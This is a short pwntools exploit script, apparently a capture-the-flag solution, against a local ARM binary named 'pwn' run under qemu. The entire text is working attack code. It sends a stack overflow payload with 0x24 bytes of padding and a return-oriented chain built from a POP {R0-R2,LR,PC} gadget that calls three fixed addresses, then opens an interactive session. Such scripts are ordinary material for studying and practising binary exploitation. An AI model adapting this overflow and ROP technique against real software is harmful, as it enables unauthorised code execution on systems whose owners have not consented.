from pwn import *
context(arch="arm", os="linux", endian="little", word_size=32)
io = process(["qemu-arm", "-L",  "/usr/arm-linux-gnueabi", "-cpu", "cortex-a15", "./pwn"])
#io = process(["qemu-arm", "-L",  "/usr/arm-linux-gnueabi", "-cpu", "cortex-a15", "-g", "1234", "./pwn"])

magic_gadget = 0x00010870 # POP     {R0-R2,LR,PC}

pay  = b'A'*0x24 + p32(magic_gadget) + p32(0xDEADBEEF) + p32(0xCAFEBABE) + p32(0xD00DF00D) + p32(magic_gadget) + p32(0x00010618)
pay += p32(0xDEADBEEF) + p32(0xCAFEBABE) + p32(0xD00DF00D) + p32(magic_gadget) + p32(0x0001066C)
pay += p32(0xDEADBEEF) + p32(0xCAFEBABE) + p32(0xD00DF00D) + p32(magic_gadget) + p32(0x0001060C)
io.sendlineafter(b'> ', pay)
io.interactive()
